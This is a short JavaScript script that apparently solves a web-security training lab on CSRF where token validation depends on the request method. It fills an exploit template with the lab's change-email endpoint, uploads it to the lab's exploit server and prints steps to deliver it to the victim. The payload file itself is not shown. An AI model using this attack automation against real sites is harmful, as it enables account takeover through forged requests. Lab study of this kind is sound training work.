import { ExploitServer } from "../../../utils/exploitServer.js";
import { getParsedInput } from "../../../utils/getParsedInput.js";
import { runTasks } from "../../../utils/runTasks.js";
import { createExploit } from "../utils/createExploit.js";

const { url, httpClient } = getParsedInput({
  description: "Lab: CSRF where token validation depends on request method",
  proxy: true,
});

async function task() {
  const exploit = await getExploit();
  const exploitServer = await ExploitServer.create(url, httpClient);
  await exploitServer.storeExploit(exploit);

  console.log(`To solve the lab:
  1. Visit ${exploitServer.url}
  2. Press "Deliver exploit to victim" button`);
}

async function getExploit() {
  const exploitFilePath = new URL("./exploit.html", import.meta.url);
  const actionUrl = url + "my-account/change-email";
  return createExploit(exploitFilePath, { actionUrl });
}

runTasks([task]);
